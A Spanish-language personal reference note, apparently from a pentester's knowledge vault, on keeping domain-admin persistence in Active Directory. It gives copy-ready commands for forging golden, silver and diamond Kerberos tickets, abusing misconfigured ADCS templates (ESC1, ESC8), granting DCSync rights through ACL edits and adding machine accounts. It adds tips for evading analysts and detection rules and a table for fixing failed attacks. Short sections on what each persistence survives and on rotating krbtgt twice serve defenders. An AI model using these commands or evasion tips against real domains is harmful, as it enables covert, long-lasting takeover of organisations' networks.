---
tipo: meta
aliases:
  - Persistencia en AD
  - ticketer
  - certipy
  - dacledit
tags:
  - meta/referencia
  - dominio/ad
---

# AD persistencia - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué se hace con acceso de administrador de dominio para no perderlo. El criterio está en [[Golden ticket]] y [[ADCS - certificado con SAN arbitrario]].

## 0. Qué sobrevive a qué

La pregunta que ordena el dominio no es cuál es más fácil, sino **qué acción defensiva la mata**.

| Persistencia | Muere cuando | Cuánto dura en la práctica |
|---|---|---|
| Golden ticket | Se rota `krbtgt` **dos veces** | Hasta diez años si nadie la rota |
| Silver ticket | Se rota la contraseña de esa cuenta de servicio | Años |
| Certificado con SAN arbitrario | Se revoca el certificado **y** se arregla la plantilla | Hasta que caduca, típicamente uno o dos años |
| ACL de DCSync sobre el dominio | Alguien audita las ACL del objeto raíz | Indefinido, y nadie las audita |
| Cuenta nueva en Domain Admins | La primera revisión de membresías | Días |

El certificado es la más incómoda de sacar: sobrevive al cambio de contraseña del usuario, porque la autenticación por certificado no depende de la contraseña.

## 1. Golden ticket

Necesita el hash de `krbtgt` y el SID del dominio.

`secretsdump.py -just-dc-user krbtgt dominio.local/admin:'pass'@10.0.0.10`
`lookupsid.py dominio.local/admin:'pass'@10.0.0.10 0`

`ticketer.py -nthash HASH_KRBTGT -domain-sid S-1-5-21-111-222-333 -domain dominio.local Administrador`
`export KRB5CCNAME=Administrador.ccache`
`psexec.py -k -no-pass dominio.local/Administrador@dc.dominio.local`

`mimikatz # kerberos::golden /user:Administrador /domain:dominio.local /sid:S-1-5-21-... /krbtgt:HASH /ptt`

> [!tip] Los valores por defecto son la firma
> `ticketer.py` pone diez años de validez y mimikatz mete los grupos `513 512 520 518 519`. Un TGT de diez años es un valor que Windows nunca emite —el máximo real es diez horas, renovable siete días— y es lo primero que mira un analista. `/endin:600 /renewmax:10080` lo deja dentro de lo normal.

`ticketer.py ... -groups 512,513,518,519,520 -duration 10`

## 2. Silver ticket

`ticketer.py -nthash HASH_DE_LA_CUENTA -domain-sid S-1-5-21-... -domain dominio.local -spn CIFS/servidor.dominio.local Administrador`

Alcanza un solo servicio, y **por eso no toca al controlador de dominio**: no hay `4768` ni `4769` porque no se pide nada al KDC. Contra un golden ticket, es más limitado y mucho más silencioso.

SPN útiles según qué se quiera:

| SPN | Qué habilita |
|---|---|
| `CIFS/host` | Recursos compartidos, y con eso `psexec` |
| `HOST/host` | Tareas programadas, servicios |
| `HTTP/host` | WinRM, PowerShell remoto |
| `MSSQLSvc/host:1433` | Base de datos |
| `LDAP/dc` | Suficiente para DCSync |

## 3. Diamond y sapphire ticket

`Rubeus.exe diamond /krbkey:AES_KRBTGT /user:usuario /password:pass /enctype:aes /ticketuser:Administrador`

En vez de forjar un TGT de cero, pide uno legítimo y le modifica el contenido. La diferencia importa del lado azul: el golden ticket no tiene `4768` previo —que es justo lo que busca [[Ticket de servicio sin ticket inicial previo]]— y el diamond **sí lo tiene**, porque el TGT nació de una petición real.

Es la evolución directa de la detección: la regla que ve un golden no ve un diamond.

## 4. ADCS — el certificado como persistencia

`certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -vulnerable -stdout`
Busca plantillas mal configuradas. Salida `ESC1` a `ESC8`, cada una un abuso distinto.

**ESC1** — la plantilla deja poner el sujeto y permite autenticación:

`certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template VulnTemplate -upn administrador@dominio.local`
`certipy auth -pfx administrador.pfx -dc-ip 10.0.0.10`

Devuelve un TGT y el hash NT del administrador. Ver [[ADCS - certificado con SAN arbitrario]].

**ESC8** — relay de NTLM al endpoint web de la CA:

`certipy relay -ca 10.0.0.30 -template DomainController`

| Código | Qué está mal en la plantilla |
|---|---|
| `ESC1` | El solicitante fija el sujeto y la plantilla sirve para autenticar |
| `ESC2` | La plantilla vale para cualquier propósito |
| `ESC3` | Agente de inscripción: se pide en nombre de otro |
| `ESC4` | La ACL de la plantilla es escribible — se la vuelve vulnerable y se la deja como estaba |
| `ESC6` | La CA acepta SAN arbitrario en cualquier plantilla |
| `ESC8` | El endpoint HTTP de la CA acepta NTLM y no exige firma |

## 5. ACL como persistencia

`dacledit.py -action write -rights DCSync -principal usuario -target-dn 'DC=dominio,DC=local' dominio.local/admin:'pass'`

Deja a un usuario cualquiera con derechos de replicación. No aparece en ninguna lista de membresías y sobrevive a la rotación de contraseñas.

`addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pass123' dominio.local/user:'pass'`
Por defecto cualquier usuario del dominio puede crear hasta diez cuentas de máquina (`ms-DS-MachineAccountQuota`). Es el insumo de varios abusos de delegación.

`Add-DomainObjectAcl -TargetIdentity 'DC=dominio,DC=local' -PrincipalIdentity usuario -Rights DCSync`

## 6. Rotar `krbtgt` — por qué dos veces

La cuenta guarda la contraseña actual **y la anterior**, para que los tickets emitidos antes de una rotación sigan siendo válidos. Rotar una sola vez deja el golden ticket funcionando contra la clave anterior.

Hay que rotar dos veces, esperando entre una y otra a que caduquen los tickets en circulación —diez horas cubre el caso normal—. Rotar las dos seguidas invalida todos los tickets del dominio de golpe y tira los servicios abajo.

Es la única acción defensiva del vault donde **hacerla mal es peor que no hacerla**: rotar una vez da sensación de haber cerrado el agujero y no lo cierra.

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El golden ticket no funciona | SID del dominio equivocado. Tiene que ser el del dominio, no el del usuario |
| `KDC_ERR_TGT_REVOKED` | Rotaron `krbtgt` dos veces. El ticket está muerto |
| El silver ticket falla contra un servicio | SPN mal escrito. Copiarlo de la salida de `setspn -T dominio.local -Q */*` |
| `certipy` no encuentra plantillas vulnerables | La CA está bien configurada, o falta permiso de lectura sobre el contenedor de plantillas |
| `certipy auth` devuelve `KDC_ERR_CLIENT_NAME_MISMATCH` | Falta la extensión de mapeo fuerte (KB5014754). El dominio ya no acepta el mapeo implícito por UPN |
| `dacledit` devuelve acceso denegado | Falta `WriteDacl` sobre el objeto raíz. Se necesita admin de dominio, no solo admin local |

## Relacionadas

[[MOC - Active Directory]] · [[Golden ticket]] · [[ADCS - certificado con SAN arbitrario]] · [[DCSync]] · [[Ticket de servicio sin ticket inicial previo]]
